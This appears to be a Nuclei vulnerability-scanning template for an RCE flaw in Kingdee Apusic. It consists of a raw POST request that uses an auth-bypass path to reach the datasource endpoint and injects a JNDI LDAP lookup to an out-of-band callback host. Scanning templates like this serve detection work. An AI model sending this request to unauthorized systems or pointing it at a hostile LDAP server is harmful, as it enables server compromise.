id: kingdee-apusic-createDataSource-rce

info:
  name: kingdee-apusic-createDataSource-rce
  author: msk
  severity: high

http:
  - raw:
      - |
        POST /admin/;//protect/datasource/createDataSource HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip
        Connection: close

        name=xxxx6ac8B5&jndiName=ldap://{{interactsh-url}}/gpowuasder&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=xxxxasdasxasx&userName=xxxxasdasxasx&password=xxxxasdasxasx&repassword=xxxxasdasxasx&connectionURL=sdasd&driverClassName=java.lang.String&testCommand=


    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"